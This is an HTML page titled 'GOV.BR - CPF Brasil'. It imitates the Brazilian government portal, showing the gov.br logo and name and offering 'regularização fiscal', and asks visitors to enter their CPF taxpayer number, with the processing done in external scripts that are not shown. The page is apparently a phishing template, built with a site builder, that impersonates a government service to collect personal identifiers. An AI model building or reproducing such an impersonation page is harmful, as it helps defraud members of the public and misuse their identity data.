
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GOV.BR - CPF Brasil</title>
    <meta name="description" content="GOV.BR - CPF Brasil">
    <meta name="author" content="GOV.BR">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/styles.css">
    <meta property="og:title" content="GOV.BR - CPF Brasil">
    <meta property="og:description" content="Consulta de CPF e regularização fiscal">
    <meta property="og:type" content="website">
</head>
<body>
    <div class="govbr-bg">
        <div id="loading-screen" class="loading-screen hidden">
            <div class="loading-container">
                <div class="spinner-large"></div>
                <p id="loading-message">Verificando seus dados...</p>
            </div>
        </div>
        
        <div id="main-form" class="govbr-card">
            <div class="logo-container">
                <img src="../lovable-uploads/9a5b75c1-0a3c-4e4d-872e-a0eec71b6b4f.png" alt="Gov.br Logo" class="logo-img">
            </div>
            
            <div class="text-center">
                <h1>Bem-vindo ao CPF Brasil</h1>
                <p class="subtitle">do GOV.br</p>
            </div>
            
            <p class="terms-text">
                Ao entrar, você concorda com nosso
                <a href="#" class="link">Termo de Responsabilidade e Política de Privacidade</a>
            </p>
            
            <form id="cpf-form">
                <div class="form-group">
                    <label for="cpf" class="form-label">
                        Digite seu CPF para acessar
                    </label>
                    <div class="input-container">
                        <input 
                            type="text" 
                            id="cpf" 
                            class="input-field" 
                            placeholder="Digite apenas números"
                            maxlength="14"
                        >
                        <span id="cpf-error" class="error-message hidden">CPF inválido. Digite um CPF com 11 dígitos.</span>
                    </div>
                </div>
                
                <button type="submit" class="govbr-btn" id="submit-btn">
                    <span id="btn-text">ENTRAR COM O GOV.BR</span>
                    <span id="btn-loading" class="hidden">
                        <span class="spinner"></span>
                        <span>PROCESSANDO...</span>
                    </span>
                </button>
            </form>
        </div>
    </div>
    
    <div id="toast-container" class="toast-container"></div>
    
    <script src="js/utils.js"></script>
    <script src="js/api.js"></script>
    <script src="js/main.js"></script>
</body>
</html>
